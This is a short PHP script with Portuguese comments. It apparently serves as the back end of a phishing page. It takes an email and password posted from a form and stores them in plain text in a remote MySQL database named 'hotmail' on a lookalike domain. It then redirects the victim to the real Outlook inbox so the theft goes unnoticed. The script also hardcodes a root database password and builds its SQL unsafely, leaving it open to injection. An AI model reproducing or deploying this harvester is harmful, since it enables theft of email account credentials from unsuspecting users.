<?php
// Conexão com o banco de dados (substitua com suas configurações)
$servername = "ciinemark.com.br";
$username = "root";
$password = "Risada1711.";
$dbname = "hotmail";

$conn = new mysqli($servername, $username, $password, $dbname);

// Verificar a conexão
if ($conn->connect_error) {
    die("Conexão com o banco de dados falhou: " . $conn->connect_error);
}
// Dados do formulário (substitua com os nomes dos campos do seu formulário)
$email = $_POST["email"];
$senha = $_POST["password"];

// Verifica se o e-mail e a senha foram fornecidos
if (!empty($email) && !empty($senha)) {
    // Preparar a consulta SQL para inserir os dados no banco de dados
    $sql = "INSERT INTO usuarios (email, senha) VALUES ('$email', '$senha')";

    if ($conn->query($sql) === TRUE) {
// Redirecionamento para uma nova página
$nova_pagina = "https://outlook.live.com/mail/0/?nlp=1";
header("Location: $nova_pagina");
exit; // Importante: encerre o script após o redirecionamento

    } else {
        echo "Erro: " . $sql . "<br>" . $conn->error;
    }
} else {
    echo "Por favor, forneça um e-mail e uma senha.";
}

$conn->close();
?>
